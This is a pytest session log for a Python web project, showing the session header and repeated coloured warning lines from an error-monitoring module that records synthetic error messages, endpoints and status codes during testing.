============================= test session starts ==============================
platform linux -- Python 3.13.5, pytest-8.3.5, pluggy-1.5.0 -- /home/paul/boardroom-repo/.venv/bin/python
cachedir: .pytest_cache
rootdir: /home/paul/boardroom-repo
configfile: pyproject.toml
plugins: mock-3.14.0, langsmith-0.3.21, cov-6.2.1, Faker-37.4.0, xdist-3.8.0, anyio-4.9.0, asyncio-1.0.0, env-1.1.5
asyncio: mode=Mode.AUTO, asyncio_default_fixture_loop_scope=function, asyncio_default_test_loop_scope=function
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4360'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922571Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4361'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922622Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4362'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922678Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4363'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922732Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4364'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922783Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4365'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922832Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4366'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922881Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4367'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922932Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4368'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922984Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4369'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923034Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4370'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923084Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4371'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923133Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4372'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923182Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4373'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923232Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4374'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923283Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4375'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923332Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4376'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923431Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4377'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923500Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4378'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923557Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4379'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923608Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4380'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923664Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4381'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923715Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4382'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923766Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4383'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923815Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4384'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923864Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4385'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923965Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4386'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
